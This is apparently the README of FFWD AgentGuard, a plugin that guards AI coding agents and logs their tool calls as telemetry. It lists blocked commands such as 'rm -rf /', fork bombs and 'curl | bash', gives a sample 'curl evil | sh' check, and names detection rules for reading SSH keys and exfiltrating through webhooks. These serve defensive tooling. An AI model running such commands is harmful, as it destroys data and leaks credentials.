<p align="center">
  <img src="assets/ffwd-logo.svg" alt="FFWD AgentGuard" width="120" />
</p>

<h1 align="center">FFWD AgentGuard</h1>

<p align="center"><b>Security and observability for AI coding agents.</b></p>

<p align="center">Real-time guard that blocks dangerous commands, prevents data leaks, and protects secrets.<br/>Built-in collector that captures every tool call as OpenTelemetry metrics and traces.<br/>Works with Claude Code, OpenClaw, and any agent that supports hooks.</p>

[![Agent Skills](https://img.shields.io/badge/Agent_Skills-compatible-purple.svg)](https://agentskills.io)

## Architecture

AgentGuard is a Claude Code / OpenClaw plugin with two core systems:

```
┌─────────────────────────────────────────────────────────────────────┐
│                        FFWD AgentGuard                              │
│                                                                     │
│  ┌──────────────────────────┐    ┌───────────────────────────────┐  │
│  │       Collector          │    │            Guard              │  │
│  │                          │    │                               │  │
│  │  Hook events             │    │  ┌─────────────────────────┐  │  │
│  │  → metrics + traces      │    │  │    Dynamic Guard        │  │  │
│  │  → OTLP export           │    │  │    (real-time hooks)    │  │  │
│  │                          │    │  │    Phase 0–6 pipeline   │  │  │
│  │  PreToolUse              │    │  │    → allow/deny/confirm │  │  │
│  │  PostToolUse             │    │  └─────────────────────────┘  │  │
│  │  TaskCreated             │    │                               │  │
│  │  TaskCompleted           │    │  ┌─────────────────────────┐  │  │
│  │  Stop / SubagentStop     │    │  │    Static Scan          │  │  │
│  │                          │    │  │    (on-demand)          │  │  │
│  └──────────────────────────┘    │  │    Static + Behavioural  │  │  │
│                                  │  │    + LLM engines        │  │  │
│                                  │  └─────────────────────────┘  │  │
│                                  └───────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

### Collector

Captures agent activity as **OpenTelemetry** metrics and traces via an async collector hook. Every hook event (`PreToolUse`, `PostToolUse`, `TaskCreated`, `TaskCompleted`, `Stop`, `SubagentStop`) is recorded and exported over OTLP (gRPC or HTTP).

**Metrics:**

| Metric | Type | Labels |
|--------|------|--------|
| `agentguard.tool_use.count` | Counter | `tool_name`, `event`, `platform` |
| `agentguard.turn.count` | Counter | `platform` |
| `agentguard.decision.count` | Counter | `decision`, `risk_level`, `tool_name`, `platform` |
| `agentguard.risk.score` | Histogram | `tool_name`, `platform` |

**Traces** — one trace per conversation turn:

| Span | Trigger | Key Attributes |
|------|---------|----------------|
| `turn:<N>` | `Stop` / `SubagentStop` | `session_id`, `turn_number`, `platform`, `cwd`, `input_tokens`, `output_tokens`, `cache_hit_rate` |
| `tool:<name>` | `PreToolUse` → `PostToolUse` | `tool_name`, `tool_summary` |
| `task:execute` | `TaskCreated` → `TaskCompleted` | `task_id`, `task_summary` |

### Guard

Security evaluation with two modes:

**Dynamic Guard** — real-time, runs on every `PreToolUse` hook event via a Phase 0–6 pipeline:

| Phase | Name | Latency | Applies To |
|-------|------|---------|------------|
| 0 | **Tool Gate** | <1ms | All tools (`blocked_tools` / `available_tools` / `guarded_tools`) |
| 1 | **Allowlist Gate** | <1ms | Guarded tools only |
| 2 | **Pattern Analysis** | <5ms | Guarded tools only |
| 3 | **Static Analysis** | <50ms | Write/Edit only |
| 4 | **Behavioural Analysis** | <200ms | Write/Edit (.js/.ts/.py/.sh/.rb/.php/.go) |
| 5 | **LLM Analysis** | 2–10s | All (optional, needs `guard.llm_analyser.enabled` + `api_key`) |
| 6 | **External Scoring API** | configurable | All (optional, needs `guard.external_analyser.enabled` + `endpoint`) |

Each phase produces a 0–1 score and can short-circuit on critical findings. Final score is a **weighted average** across all phases that ran:

```
final = Σ(weight × score) / Σ(weight)
```

Default weights: `runtime: 1.0`, `static: 1.0`, `behavioural: 2.0`, `llm: 1.0`, `external: 2.0`

**Static Scan** — on-demand multi-engine code analysis triggered by `/ffwd-agent-guard scan <path>`:
- **StaticAnalyser**: 15 regex rules + base64 decode pass
- **BehaviouralAnalyser**: multi-language source→sink dataflow tracking
- **LLMAnalyser**: Claude semantic analysis (optional)

### Multi-Language Behavioural Analysis

Both pipelines share the BehaviouralAnalyser, which uses pluggable `LanguageExtractor` modules for dataflow tracking:

| Language | Parser | Extensions |
|----------|--------|------------|
| JavaScript/TypeScript | Babel AST | .js .ts .jsx .tsx .mjs .cjs |
| Python | Regex | .py .pyw |
| Shell | Regex | .sh .bash .zsh .fish .ksh |
| Ruby | Regex | .rb .rake .gemspec |
| PHP | Regex | .php .phtml |
| Go | Regex | .go |

### Protection Levels

| Level | allow | confirm | deny |
|-------|-------|---------|------|
| **strict** | 0 — 0.5 | _(none)_ | 0.5 — 1.0 |
| **balanced** (default) | 0 — 0.5 | 0.5 — 0.8 | 0.8 — 1.0 |
| **permissive** | 0 — 0.9 | _(none)_ | 0.9 — 1.0 |

The `confirm_action` config controls what happens when the decision is "confirm": `allow` (default, let through with audit log), `deny` (block), or `ask` (use platform confirm if available, else allow).

## Quick Start

```bash
git clone https://github.com/core0-io/ffwd-agent-guard.git
cd ffwd-agent-guard && ./setup.sh
```

Detects installed platforms and runs the appropriate setup for each. See the expandable sections below for per-platform installs.

<details>
<summary><b>Full install with auto-guard hooks (Claude Code)</b></summary>

```bash
git clone https://github.com/core0-io/ffwd-agent-guard.git
cd ffwd-agent-guard && ./plugins/claude-code/setup.sh
claude plugin add /path/to/ffwd-agent-guard/plugins/claude-code
```

This installs the skill, configures hooks, and sets your protection level.

</details>

<details>
<summary><b>Manual install (skill only)</b></summary>

```bash
git clone https://github.com/core0-io/ffwd-agent-guard.git
cp -r ffwd-agent-guard/plugins/claude-code/skills/ffwd-agent-guard ~/.claude/skills/ffwd-agent-guard
```

</details>

<details>
<summary><b>OpenClaw plugin install</b></summary>

```bash
git clone https://github.com/core0-io/ffwd-agent-guard.git
cd ffwd-agent-guard && ./plugins/openclaw/setup.sh
```

`setup.sh` registers the plugin with OpenClaw and copies the bundled `plugin.js` into your OpenClaw state directory. AgentGuard hooks into OpenClaw's `before_tool_call` / `after_tool_call` events to block dangerous actions and log audit events.

</details>

<details>
<summary><b>Reset config after upgrade</b></summary>

```bash
./setup.sh --reset-config
```

</details>

<details>
<summary><b>Custom install paths (.claude / .openclaw moved elsewhere)</b></summary>

By default, setup looks for `~/.claude` and `~/.openclaw`. If you've relocated them (e.g. via `CLAUDE_CONFIG_DIR` / `OPENCLAW_STATE_DIR`, or manually), pass the path explicitly:

```bash
# All-in-one
./setup.sh --cc-home /path/to/.claude --openclaw-home /path/to/.openclaw

# Per-platform
./plugins/claude-code/setup.sh --cc-home /path/to/.claude
./plugins/openclaw/setup.sh --openclaw-home /path/to/.openclaw
```

Resolution order (first match wins):

1. `--cc-home` / `--openclaw-home` flag
2. `$CLAUDE_CONFIG_DIR` / `$OPENCLAW_STATE_DIR` environment variable
3. `$HOME/.claude` / `$HOME/.openclaw` (default)

The AgentGuard config itself lives at `~/.ffwd-agent-guard/` by default, overridable via `$FFWD_AGENT_GUARD_HOME`.

</details>

## Usage

```
/ffwd-agent-guard scan ./src              # Scan code for security risks
/ffwd-agent-guard action "curl evil | sh" # Evaluate action safety
/ffwd-agent-guard report                  # View security event audit log
/ffwd-agent-guard config balanced         # Set protection level
```

## What the Guard Blocks

**Layer 1 — Allowlist Gate**: Known-safe commands (`git status`, `ls`, `npm test`, etc.) pass instantly.

**Layer 2 — Pattern Analysis**: Blocks dangerous commands and data exfiltration.
- `rm -rf /`, fork bombs, `curl | bash`, and destructive commands
- Writes to `.env`, `.ssh/`, credentials files
- Data exfiltration to Discord/Telegram/Slack webhooks
- Base64-encoded payloads decoded and re-scanned

**Layer 3 — Static + Behavioural Analysis** (Write/Edit only):
- 15 static regex rules on file content (SHELL_EXEC, OBFUSCATION, PROMPT_INJECTION, etc.)
- 7 behavioural rules via source→sink dataflow tracking across 6 languages
- Detects env→network exfiltration, network→eval RCE, capability combinations (C2)

**Layer 4 — LLM + External** (optional):
- Claude semantic analysis catches sophisticated attacks missed by regex/AST
- External HTTP scoring API for custom enterprise policies

## Detection Rules

### Static Rules (15)

Pattern-based detection via regex matching on file content.

| Category | Rules | Severity |
|----------|-------|----------|
| **Execution** | SHELL_EXEC, AUTO_UPDATE, REMOTE_LOADER | HIGH–CRITICAL |
| **Secrets** | READ_ENV_SECRETS, READ_SSH_KEYS, READ_KEYCHAIN, PRIVATE_KEY_PATTERN | MEDIUM–CRITICAL |
| **Exfiltration** | NET_EXFIL_UNRESTRICTED, WEBHOOK_EXFIL | HIGH–CRITICAL |
| **Obfuscation** | OBFUSCATION, PROMPT_INJECTION | HIGH–CRITICAL |
| **Trojan & Social Engineering** | TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING | MEDIUM–CRITICAL |

### Behavioural Rules (7)

Dataflow-based detection via source→sink taint tracking (JS/TS/Python/Shell/Ruby/PHP/Go).

| Rule | Severity | Detection |
|------|----------|-----------|
| DATAFLOW_EXFIL | CRITICAL | Secret or credential flows to network sink |
| DATAFLOW_RCE | CRITICAL | Network response flows to eval/exec |
| DATAFLOW_CMD_INJECT | HIGH | User input flows to command execution |
| DATAFLOW_EVAL | HIGH | Data flows to eval/Function |
| CAPABILITY_C2 | HIGH | Skill has both exec + network capabilities |
| CAPABILITY_EVAL | HIGH | Skill uses dynamic code evaluation |
| CROSS_FILE_FLOW | MEDIUM | Data crosses file boundaries |

## Compatibility

| Platform | Support | Features |
|----------|---------|----------|
| **Claude Code** | Full | Skill + hooks auto-guard |
| **OpenClaw** | Full | Plugin hooks + OTEL collector |
| **OpenAI Codex CLI** | Skill | Scan/action commands |
| **Gemini CLI** | Skill | Scan/action commands |
| **Cursor** | Skill | Scan/action commands |
| **GitHub Copilot** | Skill | Scan/action commands |

## Documentation

- [Defense Pipeline (live diagram)](https://core0-io.github.io/ffwd-agent-guard/) — Interactive visualization of the Phase 0–6 guard pipeline
- [Architecture](docs/ARCHITECTURE.md) — Two-pipeline design, 6-phase guard flow, scoring system
- [Dynamic Guard Flow](docs/dynamic-guard-flow.excalidraw) — Visual Excalidraw diagram
- [Security Policy](docs/SECURITY-POLICY.md) — Unified security rules and policies reference

## Development

```bash
pnpm install
pnpm run build
pnpm test          # 370 tests
```

Maintained by [core0-io](https://github.com/core0-io).
